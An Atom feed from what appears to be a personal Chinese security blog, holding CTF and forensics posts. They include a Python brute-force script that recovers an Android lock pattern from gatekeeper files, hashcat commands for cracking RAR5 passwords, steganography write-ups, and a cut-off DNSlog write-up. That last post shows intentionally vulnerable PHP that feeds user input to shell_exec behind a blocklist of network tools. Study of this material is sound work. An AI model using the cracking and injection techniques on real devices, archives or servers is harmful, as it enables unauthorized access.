<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>The blog of mklkx</title>
  <icon>https://www.gravatar.com/avatar/6304657417bd40e9a3c6f5c53a19ef73</icon>
  
  <link href="http://mklkx.github.io/atom.xml" rel="self"/>
  
  <link href="http://mklkx.github.io/"/>
  <updated>2021-09-22T07:03:21.974Z</updated>
  <id>http://mklkx.github.io/</id>
  
  <author>
    <name>煤矿路口西</name>
    <email>mklkx_yep@163.com</email>
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>破解Android镜像锁屏密码</title>
    <link href="http://mklkx.github.io/2021/09/21/%E7%A0%B4%E8%A7%A3Android%E9%95%9C%E5%83%8F%E9%94%81%E5%B1%8F%E5%AF%86%E7%A0%81/"/>
    <id>http://mklkx.github.io/2021/09/21/%E7%A0%B4%E8%A7%A3Android%E9%95%9C%E5%83%8F%E9%94%81%E5%B1%8F%E5%AF%86%E7%A0%81/</id>
    <published>2021-09-21T03:06:50.000Z</published>
    <updated>2021-09-22T07:03:21.974Z</updated>
    
    <content type="html"><![CDATA[<h3><span id="破解android镜像锁屏密码">破解Android镜像锁屏密码</span></h3><hr><h4><span id="制作准备">制作准备</span></h4><p>首先我们需要手动制作一个Android镜像。</p><p>此处我们采用方便的“夜神模拟器”直接创建一个安卓镜像，并设置锁屏密码</p><p><img lazyload src="/images/loading.svg" data-src="make_1.jpg" alt="make_1"></p><h4><span id="破解过程">破解过程</span></h4><p>取证大师打开vmdk文件</p><p>nox_2-disk2.vmdk/分区3/system/<strong>device_policies.xml</strong></p><p>nox_2-disk2.vmdk/分区3/system/<strong>gatekeeper.password.key</strong></p><p>nox_2-disk2.vmdk/分区3/system/<strong>gatekeeper.pattern.key</strong></p><p><img lazyload src="/images/loading.svg" data-src="make_2.jpg" alt="make_2"></p><p>根据device_policies.xml文件中，我们得到该解锁图案的长度为9</p><p><img lazyload src="/images/loading.svg" data-src="make_3.jpg" alt="make_3"></p><p>同时我们可以看到密码由纯数字构成。</p><p>在此基础上，个人认为除了图案密码，其他的密码也有了爆破的可行性。</p><p>结合scrypt-hash算法<a class="link" href="https://github.com/dannycoates/scrypt-hash">GitHub - dannycoates/scrypt-hash: node bindings for crypto_scrypt<i class="fas fa-external-link-alt"></i></a>，对文中给出的m-pass-hash.py进行改进后</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">import struct</span><br><span class="line">import binascii</span><br><span class="line">import pyscrypt</span><br><span class="line"></span><br><span class="line">N &#x3D; 16384</span><br><span class="line">r &#x3D; 8</span><br><span class="line">p &#x3D; 1</span><br><span class="line"></span><br><span class="line">f &#x3D; open(&#39;gatekeeper.pattern.key&#39;, &#39;rb&#39;)  # 读取gatekeeper.pattern.key文件</span><br><span class="line">blob &#x3D; f.read()</span><br><span class="line">s &#x3D; struct.Struct(&#39;&lt;&#39; + &#39;17s 8s 32s&#39;)</span><br><span class="line">(meta, salt, signature) &#x3D; s.unpack_from(blob)  # 提取其中关键的信息</span><br><span class="line"></span><br><span class="line">f1 &#x3D; open(&#39;password.txt&#39;, &#39;r&#39;)  # 读取字典</span><br><span class="line">lines &#x3D; f1.readlines()</span><br><span class="line">for data in lines:</span><br><span class="line">    password &#x3D; data.strip()</span><br><span class="line">    # print meta</span><br><span class="line">    to_hash &#x3D; meta</span><br><span class="line">    # print to_hash</span><br><span class="line">    print password</span><br><span class="line">    # print signature</span><br><span class="line">    to_hash +&#x3D; password # 将字典中读取的密码和meta信息组合成to_hash</span><br><span class="line">    hash &#x3D; pyscrypt.hash(to_hash, salt, N, r, p, dkLen&#x3D;32)</span><br><span class="line">    print &#39;signature  %s&#39; % signature.encode(&#39;hex&#39;)</span><br><span class="line"></span><br><span class="line">    print &#39;Hash:      %s&#39; % hash[0:32].encode(&#39;hex&#39;)  # 取hash值的前32位</span><br><span class="line"></span><br><span class="line">    print &#39;Equal:     %s&#39; % (hash[0:32] &#x3D;&#x3D; signature)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    if hash[0:32] &#x3D;&#x3D; signature:  # 如果相同，程序结束</span><br><span class="line">        print(&quot;OK&quot;)</span><br><span class="line">        exit()</span><br></pre></td></tr></table></figure><p>其中的password.txt实际是不重复的1-9的全排列：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file1&#x3D;open(&#39;password.txt&#39;,&#39;a&#39;)</span><br><span class="line">for a in &quot;123456789&quot;:</span><br><span class="line">    for b in &quot;123456789&quot;:</span><br><span class="line">        for c in &quot;123456789&quot;:</span><br><span class="line">            for d in &quot;123456789&quot;:</span><br><span class="line">                for e in &quot;123456789&quot;:</span><br><span class="line">                    for f in &quot;123456789&quot;:</span><br><span class="line">                        for g in &quot;123456789&quot;:</span><br><span class="line">                            for h in &quot;123456789&quot;:</span><br><span class="line">                                for i in &quot;123456789&quot;:</span><br><span class="line">                                    if a !&#x3D; b and a !&#x3D; c and a !&#x3D; d and a !&#x3D; e and a !&#x3D; f and a!&#x3D; g  and a !&#x3D; h  and a !&#x3D;i\</span><br><span class="line">                                            and b !&#x3D; c and b!&#x3D; d and  b !&#x3D; e and b !&#x3D; f and b!&#x3D; g  and b !&#x3D; h  and b !&#x3D;i\</span><br><span class="line">                                            and c!&#x3D; d and c !&#x3D; e and c !&#x3D; f and c!&#x3D; g  and c !&#x3D; h and c !&#x3D;i\</span><br><span class="line">                                            and d !&#x3D; e and d !&#x3D; f and d!&#x3D; g and d !&#x3D; h and d !&#x3D;i\</span><br><span class="line">                                            and e !&#x3D; f and e!&#x3D; g  and e !&#x3D; h and e !&#x3D;i\</span><br><span class="line">                                            and f!&#x3D; g  and f !&#x3D; h and f !&#x3D;i\</span><br><span class="line">                                            and g !&#x3D; h and g !&#x3D;i:</span><br><span class="line">                                        password &#x3D; a + b + c + d + e + f + g + h + i</span><br><span class="line">                                        file1.write(password+&#39;\n&#39;)</span><br><span class="line">file1.close()</span><br></pre></td></tr></table></figure><p>运行结果如下(python2)</p><p><img lazyload src="/images/loading.svg" data-src="make_4.jpg" alt="make_4"></p><p>从而知道锁屏密码为124578963</p><p>对应到图案为</p><p><img lazyload src="/images/loading.svg" data-src="make_5.jpg" alt="make_5"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3&gt;&lt;span id=&quot;破解android镜像锁屏密码&quot;&gt;破解Android镜像锁屏密码&lt;/span&gt;&lt;/h3&gt;
&lt;hr&gt;
&lt;h4&gt;&lt;span id=&quot;制作准备&quot;&gt;制作准备&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;首先我们需要手动制作一个Android镜像。&lt;/p&gt;
&lt;p&gt;此处我们采用</summary>
      
    
    
    
    
    <category term="取证" scheme="http://mklkx.github.io/tags/%E5%8F%96%E8%AF%81/"/>
    
  </entry>
  
  <entry>
    <title>2021工业信息安全技能大赛-1</title>
    <link href="http://mklkx.github.io/2021/08/20/2021%E5%B7%A5%E4%B8%9A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B-1/"/>
    <id>http://mklkx.github.io/2021/08/20/2021%E5%B7%A5%E4%B8%9A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B-1/</id>
    <published>2021-08-20T08:24:35.000Z</published>
    <updated>2021-08-20T09:34:57.366Z</updated>
    
    <content type="html"><![CDATA[<h3><span id="2021工业信息安全技能大赛-1">2021工业信息安全技能大赛-1</span></h3><hr><h4><span id="隐藏的工程">隐藏的工程</span></h4><blockquote><p>老代凭借多年工业企业运维经验，发现ICS工程师的工作电脑中有一张可疑的工艺图。在对图片进行分析时，发现其中存在异常信息，您能从中找到flag吗？flag格式为:flag{}</p></blockquote><p>对图片进行F5操作，</p><p>根据提示，猜测密码为ICS</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java Extract gcwj.jpg  -e 1.txt -p ICS</span><br></pre></td></tr></table></figure><p><img lazyload src="/images/loading.svg" data-src="1.png" alt="1"></p><p>得到1.txt</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;wwr.lanzoui.com&#x2F;iIMaiqcpaxg</span><br></pre></td></tr></table></figure><p>一个蓝奏云链接</p><p>通过提取得到工程文件</p><p>发现名为【汽机系统】的工程文件中存在kingview6.55的关键词</p><p><img lazyload src="/images/loading.svg" data-src="3.png" alt="3"></p><p>通过查阅，能看到这是组态王6.55的相关文件</p><p><img lazyload src="/images/loading.svg" data-src="2.png" alt="2"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3&gt;&lt;span id=&quot;2021工业信息安全技能大赛-1&quot;&gt;2021工业信息安全技能大赛-1&lt;/span&gt;&lt;/h3&gt;
&lt;hr&gt;
&lt;h4&gt;&lt;span id=&quot;隐藏的工程&quot;&gt;隐藏的工程&lt;/span&gt;&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;老代凭借多年工业企业运维经验，发现IC</summary>
      
    
    
    
    
    <category term="challenge" scheme="http://mklkx.github.io/tags/challenge/"/>
    
    <category term="MISC" scheme="http://mklkx.github.io/tags/MISC/"/>
    
  </entry>
  
  <entry>
    <title>hashcat使用手册</title>
    <link href="http://mklkx.github.io/2021/06/25/hashcat%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C/"/>
    <id>http://mklkx.github.io/2021/06/25/hashcat%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C/</id>
    <published>2021-06-25T08:57:41.000Z</published>
    <updated>2021-06-28T07:41:50.745Z</updated>
    
    <content type="html"><![CDATA[<h3><span id="hashcat使用手册">hashcat使用手册</span></h3><hr><h4><span id="写在前面">写在前面</span></h4><p>遇到一道【羊城杯】的题，在解的过程中遇到rar5</p><p>发现手头所有的工具都无法爆破，想起【Nep2021】的【make_hsy_great_again】</p><p>但由于此次为掩码爆破，故而有了这篇文章，详细谈谈hashcat的使用，作为个人的学习留存。</p><h4><span id="rar2john">rar2john</span></h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># rar2john 65.rar </span><br><span class="line">Created directory: &#x2F;root&#x2F;.john</span><br><span class="line">65.rar:$rar5$16$a2dce3925af59efb2df9851dbfc24fb1$15$bb005ea8f91bf0356c8dddcfa41ac4cb$8$62293dc5e26e9e7f</span><br></pre></td></tr></table></figure><h4><span id="hashcat-advanced-password-recovery">hashcat - advanced password recovery</span></h4><p>hashcat的基本用法为</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hashcat [options]... hash|hashfile|hccapxfile [dictionary|mask|directory]...</span><br></pre></td></tr></table></figure><p>一条常见的爆破命令</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hashcat --force -m 13000 -a 3 &#39;$rar5$16$fe5656ec27f0754cb92ca0a79120e099$15$974a98d46f1d4da877c271091ea930e9$8$48f568d6888772c2&#39; ?d?d?d?d?d?d</span><br></pre></td></tr></table></figure><p>一条掩码爆破命令</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hashcat --force -m 13000 -a 3 &#39;$rar5$16$a2dce3925af59efb2df9851dbfc24fb1$15$bb005ea8f91bf0356c8dddcfa41ac4cb$8$62293dc5e26e9e7f&#39; GW?a?a?a?a</span><br></pre></td></tr></table></figure><p>通过查询形成总结</p><h4><span id="-m攻击的哈希类型">-m#攻击的哈希类型</span></h4><p>md5系列</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">   0 | MD5                                              | Raw Hash</span><br><span class="line">  10 | md5($pass.$salt)                                 | Raw Hash, Salted and&#x2F;or Iterated</span><br><span class="line">  20 | md5($salt.$pass)                                 | Raw Hash, Salted and&#x2F;or Iterated</span><br><span class="line">  30 | md5(utf16le($pass).$salt)                        | Raw Hash, Salted and&#x2F;or Iterated</span><br><span class="line">  40 | md5($salt.utf16le($pass))                        | Raw Hash, Salted and&#x2F;or Iterated</span><br><span class="line">3800 | md5($salt.$pass.$salt)                           | Raw Hash, Salted and&#x2F;or Iterated</span><br><span class="line">3710 | md5($salt.md5($pass))                            | Raw Hash, Salted and&#x2F;or Iterated</span><br><span class="line">4010 | md5($salt.md5($salt.$pass))                      | Raw Hash, Salted and&#x2F;or Iterated</span><br><span class="line">4110 | md5($salt.md5($pass.$salt))                      | Raw Hash, Salted and&#x2F;or Iterated</span><br><span class="line">2600 | md5(md5($pass))                                  | Raw Hash, Salted and&#x2F;or Iterated</span><br><span class="line">3910 | md5(md5($pass).md5($salt))                       | Raw Hash, Salted and&#x2F;or Iterated</span><br><span class="line">4300 | md5(strtoupper(md5($pass)))                      | Raw Hash, Salted and&#x2F;or Iterated</span><br><span class="line">4400 | md5(sha1($pass))                                 | Raw Hash, Salted and&#x2F;or Iterated</span><br></pre></td></tr></table></figure><p>sha256系列</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1410 | sha256($pass.$salt)                              | Raw Hash, Salted and&#x2F;or Iterated</span><br><span class="line">1420 | sha256($salt.$pass)                              | Raw Hash, Salted and&#x2F;or Iterated</span><br><span class="line">1430 | sha256(utf16le($pass).$salt)                     | Raw Hash, Salted and&#x2F;or Iterated</span><br><span class="line">1440 | sha256($salt.utf16le($pass))                     | Raw Hash, Salted and&#x2F;or Iterated</span><br></pre></td></tr></table></figure><p>DES,3DES</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">14000 | DES (PT &#x3D; $salt, key &#x3D; $pass)                    | Raw Cipher, Known-Plaintext attack</span><br><span class="line">14100 | 3DES (PT &#x3D; $salt, key &#x3D; $pass)                   | Raw Cipher, Known-Plaintext attack</span><br></pre></td></tr></table></figure><p>CRC32校验</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">11500 | CRC32                                            | Checksums</span><br></pre></td></tr></table></figure><p>7z,rar5,zip</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">11600 | 7-Zip                                            | Archives</span><br><span class="line">12500 | RAR3-hp                                          | Archives</span><br><span class="line">13000 | RAR5                                             | Archives</span><br><span class="line">13600 | WinZip                                           | Archives</span><br></pre></td></tr></table></figure><p>TrueCrypt,VeraCrypt</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> 62XY | TrueCrypt                                        | Full-Disk Encryption (FDE)</span><br><span class="line">137XY | VeraCrypt                                        | Full-Disk Encryption (FDE)</span><br></pre></td></tr></table></figure><p>pdf系列</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10400 | PDF 1.1 - 1.3 (Acrobat 2 - 4)                    | Documents</span><br><span class="line">10410 | PDF 1.1 - 1.3 (Acrobat 2 - 4), collider #1       | Documents</span><br><span class="line">10420 | PDF 1.1 - 1.3 (Acrobat 2 - 4), collider #2       | Documents</span><br><span class="line">10500 | PDF 1.4 - 1.6 (Acrobat 5 - 8)                    | Documents</span><br><span class="line">10600 | PDF 1.7 Level 3 (Acrobat 9)                      | Documents</span><br><span class="line">10700 | PDF 1.7 Level 8 (Acrobat 10 - 11)                | Documents</span><br></pre></td></tr></table></figure><p>text</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">99999 | Plaintext                                        | Plaintext</span><br></pre></td></tr></table></figure><h4><span id="-a攻击模式">-a#攻击模式</span></h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">- [ Attack Modes ] -</span><br><span class="line"></span><br><span class="line">  # | Mode</span><br><span class="line"> &#x3D;&#x3D;&#x3D;+&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">  0 | Straight# 字典破解</span><br><span class="line">  1 | Combination# 组合破解</span><br><span class="line">  3 | Brute-force# 掩码暴力破解</span><br><span class="line">  6 | Hybrid Wordlist + Mask # 混合字典+掩码</span><br><span class="line">  7 | Hybrid Mask + Wordlist # 混合掩码+字典</span><br></pre></td></tr></table></figure><h4><span id="攻击模式">?#攻击模式</span></h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">- [ Built-in Charsets ] -</span><br><span class="line"></span><br><span class="line">  ? | Charset</span><br><span class="line"> &#x3D;&#x3D;&#x3D;+&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">  l | abcdefghijklmnopqrstuvwxyz</span><br><span class="line">  u | ABCDEFGHIJKLMNOPQRSTUVWXYZ</span><br><span class="line">  d | 0123456789</span><br><span class="line">  h | 0123456789abcdef</span><br><span class="line">  H | 0123456789ABCDEF</span><br><span class="line">  s |  !&quot;#$%&amp;&#39;()*+,-.&#x2F;:;&lt;&#x3D;&gt;?@[\]^_&#96;&#123;|&#125;~</span><br><span class="line">  a | ?l?u?d?s</span><br><span class="line">  b | 0x00 - 0xff</span><br></pre></td></tr></table></figure><p>​</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3&gt;&lt;span id=&quot;hashcat使用手册&quot;&gt;hashcat使用手册&lt;/span&gt;&lt;/h3&gt;
&lt;hr&gt;
&lt;h4&gt;&lt;span id=&quot;写在前面&quot;&gt;写在前面&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;遇到一道【羊城杯】的题，在解的过程中遇到rar5&lt;/p&gt;
&lt;p&gt;发现手头所有的工具都无法</summary>
      
    
    
    
    
    <category term="MISC" scheme="http://mklkx.github.io/tags/MISC/"/>
    
  </entry>
  
  <entry>
    <title>2021DozerCTF</title>
    <link href="http://mklkx.github.io/2021/06/06/2021DozerCTF/"/>
    <id>http://mklkx.github.io/2021/06/06/2021DozerCTF/</id>
    <published>2021-06-06T13:25:34.000Z</published>
    <updated>2021-06-06T13:37:47.182Z</updated>
    
    <content type="html"><![CDATA[<h3><span id="2021dozerctf">2021DozerCTF</span></h3><hr><h4><span id="不会有人以为re那道才是签到吧">不会有人以为re那道才是签到吧</span></h4><p>bilibili视频0.5倍速截图</p><p><img lazyload src="/images/loading.svg" data-src="1.png" alt="1"></p><h4><span id="detective_novel">detective_novel</span></h4><p>output后得到zip</p><p>zip里有flag.jpg和hint.png</p><p>hint.png丢进010editor</p><p>手动分离</p><p><img lazyload src="/images/loading.svg" data-src="2.png" alt="2"></p><p>用winrar打开</p><p>得到hint.txt【希尔顿给福尔摩斯的一封信！！！】</p><p>和letter.png</p><p>跳舞的小人易得到【DOZER】</p><p>结合hint.png中关键词【guess】</p><p>猜测为outguess加密</p><p><img lazyload src="/images/loading.svg" data-src="3.png" alt="3"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DozerCTF&#123;Y0u_arE_h0lME4&#125;</span><br></pre></td></tr></table></figure><h4><span id="一点也不杂">一点也不杂</span></h4><p>第一部分</p><p><img lazyload src="/images/loading.svg" data-src="4.png" alt="4"></p><p><img lazyload src="/images/loading.svg" data-src="5.png" alt="5"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DOYOUKNOW_CRT</span><br></pre></td></tr></table></figure><p>第二部分</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line">from functools import reduce</span><br><span class="line">def egcd(a, b):</span><br><span class="line">    &quot;&quot;&quot;扩展欧几里得&quot;&quot;&quot;</span><br><span class="line">    if 0 &#x3D;&#x3D; b:</span><br><span class="line">        return 1, 0, a</span><br><span class="line">    x, y, q &#x3D; egcd(b, a % b)</span><br><span class="line">    x, y &#x3D; y, (x - a &#x2F;&#x2F; b * y)</span><br><span class="line">    return x, y, q</span><br><span class="line">def chinese_remainder(pairs):</span><br><span class="line">    &quot;&quot;&quot;中国剩余定理&quot;&quot;&quot;</span><br><span class="line">    mod_list, remainder_list &#x3D; [p[0] for p in pairs], [p[1] for p in pairs]</span><br><span class="line">    mod_product &#x3D; reduce(lambda x, y: x * y, mod_list)</span><br><span class="line">    mi_list &#x3D; [mod_product&#x2F;&#x2F;x for x in mod_list]</span><br><span class="line">    mi_inverse &#x3D; [egcd(mi_list[i], mod_list[i])[0] for i in range(len(mi_list))]</span><br><span class="line">    x &#x3D; 0</span><br><span class="line">    for i in range(len(remainder_list)):</span><br><span class="line">        x +&#x3D; mi_list[i] * mi_inverse[i] * remainder_list[i]</span><br><span class="line">        x %&#x3D; mod_product</span><br><span class="line">    return x</span><br><span class="line">if __name__&#x3D;&#x3D;&#39;__main__&#39;:</span><br><span class="line">    print(chinese_remainder([(5,2) ,(7,2)  ,(17,9) ,(23,16)]))</span><br><span class="line"></span><br><span class="line">#5007</span><br></pre></td></tr></table></figure><p>第三部分</p><p>base85解密</p><p><img lazyload src="/images/loading.svg" data-src="6.png" alt="6"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">_good_over&#125;</span><br></pre></td></tr></table></figure><p>拼接得flag</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DozerCTF&#123;DOYOUKNOW_CRT5007_good_over&#125;</span><br></pre></td></tr></table></figure><h4><span id="funny_pixel">funny_pixel</span></h4><p>图片放大发现中心部分存在01字样</p><p><img lazyload src="/images/loading.svg" data-src="7.png" alt="7"></p><p><img lazyload src="/images/loading.svg" data-src="8.png" alt="8"></p><p>利用PS提取RGB</p><p><img lazyload src="/images/loading.svg" data-src="9.png" alt="9"></p><p>根据国赛的脚本修改</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from PIL import Image</span><br><span class="line">text&#x3D;[]</span><br><span class="line">for num in range(1,219):</span><br><span class="line">    for k in range(num,num+1):#张数一共218(1,2)(2,3)(218,219)</span><br><span class="line">        print(k)</span><br><span class="line">        im &#x3D; Image.open(&#39;%d.png&#39;%k)</span><br><span class="line">        # print(im.size[0])#310</span><br><span class="line">        # print(im.size[1])#280</span><br><span class="line">        for i in range(im.size[0]):</span><br><span class="line">            for j in range(im.size[1]):</span><br><span class="line">                if(im.getpixel((i, j))&#x3D;&#x3D;(239,239,39)):</span><br><span class="line">                    string&#x3D;str(i)+&quot;#&quot;+str(j)</span><br><span class="line">                    text.append(string)</span><br><span class="line">                    #print(im.getpixel((i,j)))</span><br><span class="line">        # img&#x3D;Image.new(&#39;RGB&#39;,(310,280))</span><br><span class="line">        # text &#x3D; file.readline()</span><br><span class="line">        #print(text)</span><br><span class="line">        ch &#x3D; []</span><br><span class="line">        x &#x3D; []</span><br><span class="line">        y &#x3D; []</span><br><span class="line">        for i in range(len(text)):</span><br><span class="line">            ch.append(str(text[i]).split(&quot;#&quot;))</span><br><span class="line">            #print(ch)</span><br><span class="line">            x &#x3D; []</span><br><span class="line">            y &#x3D; []</span><br><span class="line">            for i in ch:</span><br><span class="line">                x.append(i[0])</span><br><span class="line">                y.append(i[1])</span><br><span class="line">        print(x)</span><br><span class="line">        print(y)</span><br><span class="line">        # print(x)</span><br><span class="line">        # print(y)</span><br><span class="line">        # img &#x3D; Image.new(&#39;RGB&#39;, (310, 280))</span><br><span class="line">        # for j in range(len(x)):</span><br><span class="line">        #     print(int(x[j]),int(y[j]))</span><br><span class="line">        #     img.putpixel((int(x[j]), int(y[j])), (239, 239, 39))</span><br><span class="line">        #     img.save(&quot;test%d.png&quot; % k)</span><br></pre></td></tr></table></figure><p>考虑到如果输出图片，仍然需要肉眼识别01，</p><p>不如寻找其中的规律</p><p>观察发现</p><p><img lazyload src="/images/loading.svg" data-src="10.png" alt="10"></p><p>针对0和1，识别的内容如上图</p><p>利用notepad++进行进一步的数据操作</p><p><img lazyload src="/images/loading.svg" data-src="11.png" alt="11"></p><p><img lazyload src="/images/loading.svg" data-src="12.png" alt="12"></p><p>同时对逗号进行进一步微调后，得到</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">01000100011011110111101001100101011100100100001101010100010001100111101101000100001100000101111101111001010011110101010101011111010011000100100101101011011001010101111101010000011010010111100001000101011011000111110111</span><br></pre></td></tr></table></figure><p>在线进制转换</p><p><a class="link" href="http://www.ab126.com/goju/1711.html">http://www.ab126.com/goju/1711.html<i class="fas fa-external-link-alt"></i></a></p><p><img lazyload src="/images/loading.svg" data-src="13.png" alt="13"></p><p><strong>DozerCTF{D0_yOU_LIke_PixEl}</strong></p><h4><span id="做个问卷吧">做个问卷吧</span></h4><p><strong>DozerCTF{Thank_you_for_participating_in_DozerCTF2021}</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3&gt;&lt;span id=&quot;2021dozerctf&quot;&gt;2021DozerCTF&lt;/span&gt;&lt;/h3&gt;
&lt;hr&gt;
&lt;h4&gt;&lt;span id=&quot;不会有人以为re那道才是签到吧&quot;&gt;不会有人以为re那道才是签到吧&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;bilibili视频0.5倍速截图&lt;/p</summary>
      
    
    
    
    
    <category term="challenge" scheme="http://mklkx.github.io/tags/challenge/"/>
    
    <category term="MISC" scheme="http://mklkx.github.io/tags/MISC/"/>
    
  </entry>
  
  <entry>
    <title>美团CTF初+决</title>
    <link href="http://mklkx.github.io/2021/06/06/%E7%BE%8E%E5%9B%A2CTF%E5%88%9D-%E5%86%B3/"/>
    <id>http://mklkx.github.io/2021/06/06/%E7%BE%8E%E5%9B%A2CTF%E5%88%9D-%E5%86%B3/</id>
    <published>2021-06-06T12:48:00.000Z</published>
    <updated>2021-06-06T13:01:51.084Z</updated>
    
    <content type="html"><![CDATA[<h3><span id="美团ctf初决">美团CTF初+决</span></h3><p>团队第九</p><hr><h4><span id="different_puzzle">Different_Puzzle</span></h4><p>得到null.vhd</p><p>用360压缩打开</p><p>直接拖出来</p><p>得到69张图片，1个flag.exe</p><p>后缀名vhd，用取证大师打开</p><p>根据</p><p><img lazyload src="/images/loading.svg" data-src="1.png" alt="1"></p><p><a class="link" href="https://github.com/jschicht/UsnJrnl2Csv">https://github.com/jschicht/UsnJrnl2Csv<i class="fas fa-external-link-alt"></i></a></p><p>找到日志，</p><p><img lazyload src="/images/loading.svg" data-src="2.png" alt="2"></p><p>得到对应的png</p><p>通过PS拼接得到</p><p><img lazyload src="/images/loading.svg" data-src="3.png" alt="3"></p><p>扫描条形码得到【EuO9&amp;cDH】</p><p><img lazyload src="/images/loading.svg" data-src="4.png" alt="4"></p><p>注：此处有个大坑，若用一向以精确度闻名的支付宝扫码的话，会出现只能识别一半的情况，反倒是QQ能得到准确的内容【EuO9&amp;cDH】</p><p>运行flag.exe得到flag</p><p><img lazyload src="/images/loading.svg" data-src="5.png" alt="5"></p><p><strong>flag{af26d693-2de2-4b16-be49-d95e83a43f76}</strong></p><h4><span id="misc_cp">MISC_CP</span></h4><p>预览图看到蓝色部分的二维码</p><p>foremost后</p><p><img lazyload src="/images/loading.svg" data-src="6.png" alt="6"></p><p>扫描得到</p><p><img lazyload src="/images/loading.svg" data-src="7.png" alt="7"></p><p>11-8437-f2c73bf76c16}</p><p>另一半flag为lsb隐写</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar Stegsolove.jar</span><br></pre></td></tr></table></figure><p>在Blue plane 6时得到汉信码</p><p><img lazyload src="/images/loading.svg" data-src="8.png" alt="8"></p><p>中国编码APP</p><p><img lazyload src="/images/loading.svg" data-src="9.jpg" alt="9"></p><p>flag{d4dce746-7f13-47</p><p><strong>flag值：flag{d4dce746-7f13-4711-8437-f2c73bf76c16}</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3&gt;&lt;span id=&quot;美团ctf初决&quot;&gt;美团CTF初+决&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;团队第九&lt;/p&gt;
&lt;hr&gt;
&lt;h4&gt;&lt;span id=&quot;different_puzzle&quot;&gt;Different_Puzzle&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;得到null.vhd&lt;/p&gt;
</summary>
      
    
    
    
    
    <category term="challenge" scheme="http://mklkx.github.io/tags/challenge/"/>
    
  </entry>
  
  <entry>
    <title>DNSlog盲注</title>
    <link href="http://mklkx.github.io/2021/05/22/DNSlog%E7%9B%B2%E6%B3%A8/"/>
    <id>http://mklkx.github.io/2021/05/22/DNSlog%E7%9B%B2%E6%B3%A8/</id>
    <published>2021-05-22T08:17:46.000Z</published>
    <updated>2021-05-22T13:09:11.835Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="dnslog盲注"><em>DNSlog盲注</em></span></h1><h2><span id="题目源码如下">题目源码如下：</span></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&quot;Ginkgo&quot;]))&#123;</span><br><span class="line">    $c &#x3D; $_GET[&quot;Ginkgo&quot;];</span><br><span class="line">    if(!preg_match(&quot;&#x2F;flag|wget|sleep|socket|sock|perl|ruby|curl|php&#x2F;i&quot;, $c))&#123;</span><br><span class="line">        shell_exec(&quot;ping -c 3 &quot;.$c);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2><span id="分析">分析：</span></h2><p>传入变量Ginkgo</p><p>赋值给变量c</p><p>判断变量c是否等于&quot;/flag|wget|sleep|socket|sock|perl|ruby|curl|php/i&quot;</p><p>若不一致则执行</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ping -c 3 $c</span><br></pre></td></tr></table></figure><p>简单学习了一下http://blog.merl1ng.cc/2018/03/02/dnslog%E5%88%A9%E7%94%A8/</p><p>在pdsdt师傅的指导下</p><p>简单捋了下最终需构造的命令如下</p><figure class="highlight 